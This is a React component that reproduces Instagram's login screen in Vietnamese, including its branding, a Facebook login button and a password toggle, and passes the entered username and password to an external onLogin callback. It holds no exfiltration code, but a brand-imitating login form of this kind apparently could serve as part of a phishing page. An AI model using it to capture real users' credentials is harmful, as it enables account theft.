import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Loader, Eye, EyeOff } from 'lucide-react';

const InstagramClone = ({ onLogin, isLoading }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (username && password) {
      onLogin({ username, password });
    }
  };

  return (
    <div 
        className="w-full flex flex-col justify-center h-full p-4 sm:p-6 text-center"
    >
        <h1 className="font-instagram text-5xl sm:text-6xl mb-8">Instagram</h1>
        <form onSubmit={handleSubmit} className="space-y-3 max-w-xs mx-auto w-full">
             <Input
                type="text"
                placeholder="Số điện thoại, tên người dùng hoặc email"
                required
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full p-2 border border-gray-300 rounded-sm bg-gray-50/80 focus:ring-gray-400 focus:border-gray-400 text-black placeholder-gray-400 text-xs sm:text-sm"
            />
            <div className="relative">
                 <Input
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Mật khẩu"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full p-2 border border-gray-300 rounded-sm bg-gray-50/80 focus:ring-gray-400 focus:border-gray-400 text-black placeholder-gray-400 text-xs sm:text-sm pr-10"
                />
                <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 hover:text-gray-700"
                    aria-label={showPassword ? "Ẩn mật khẩu" : "Hiện mật khẩu"}
                >
                    {showPassword ? <EyeOff /> : <Eye />}
                </button>
            </div>
            <Button
                type="submit"
                className="w-full bg-sky-500 hover:bg-sky-600 text-white font-semibold py-1.5 sm:py-2 rounded-lg mt-4 text-sm"
                disabled={isLoading}
            >
                 {isLoading ? <Loader className="animate-spin" /> : 'Đăng nhập'}
            </Button>
        </form>
        <div className="flex items-center my-4 max-w-xs mx-auto w-full">
            <div className="flex-grow border-t border-gray-300/50"></div>
            <span className="px-4 text-xs font-semibold text-gray-500">HOẶC</span>
            <div className="flex-grow border-t border-gray-300/50"></div>
        </div>
        <button className="flex items-center justify-center w-full text-center">
             <svg className="w-4 h-4 mr-2" fill="#1877F2" viewBox="0 0 24 24"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-1.5c-1 0-1.5.5-1.5 1.5V12h3l-.5 3h-2.5v6.8c4.56-.93 8-4.96 8-9.8z"/></svg>
            <span className="text-xs sm:text-sm font-semibold text-blue-900">Đăng nhập bằng Facebook</span>
        </button>
        <a href="#" className="text-xs sm:text-sm text-blue-900 mt-4 block">Quên mật khẩu?</a>
    </div>
  );
};

export default InstagramClone;